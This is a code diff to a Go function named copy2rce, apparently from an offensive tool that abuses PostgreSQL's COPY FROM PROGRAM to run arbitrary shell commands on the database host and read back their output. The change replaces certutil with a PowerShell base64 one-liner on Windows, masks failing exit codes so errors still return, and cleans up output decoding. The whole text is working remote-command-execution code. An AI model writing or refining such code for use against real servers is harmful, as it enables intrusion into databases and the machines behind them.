@@ -143,10 +143,14 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 	var serverVersion string
 	conn.QueryRow(ctx, "SELECT version()").Scan(&serverVersion)
 	if strings.Contains(strings.ToLower(serverVersion), "visual c++") {
-		// COPY FROM PROGRAM runs the command via cmd.exe on Windows
-		cmd = "( " + cmd + " ) 2>&1 | certutil -encode - -"
+		// COPY FROM PROGRAM runs the command via cmd.exe on Windows.
+		// certutil -encode stdin mode is broken in service sessions, so
+		// base64 via PowerShell into a single line; the trailing echo
+		// neutralizes cmd's pipe exit code so failed commands still
+		// return their stderr.
+		cmd = "( " + cmd + ` ) 2>&1 | powershell -c "$s = @($input); [Convert]::ToBase64String([Text.Encoding]::Default.GetBytes(($s -join [char]10)))" & echo x > NUL`
 	} else {
-		cmd = "( " + cmd + " ) 2>&1 | base64"
+		cmd = "( " + cmd + " ) 2>&1 | base64 | tr -d '\n'"
 	}
 
 	conn.Exec(ctx, fmt.Sprintf("CREATE TABLE cmd_exec%s(cmd_output text);", salt))
@@ -174,12 +178,7 @@ func copy2rce(conn *pgx.Conn, cmd string) string {
 		if line == nil {
 			continue
 		}
-		s := strings.TrimSpace(*line)
-		// certutil wraps encoded data in BEGIN/END CERTIFICATE markers
-		if s == "" || strings.HasPrefix(s, "-----") {
-			continue
-		}
-		encoded.WriteString(s)
+		encoded.WriteString(strings.TrimSpace(*line))
 	}
 
 	decoded, err := base64.StdEncoding.DecodeString(encoded.String())
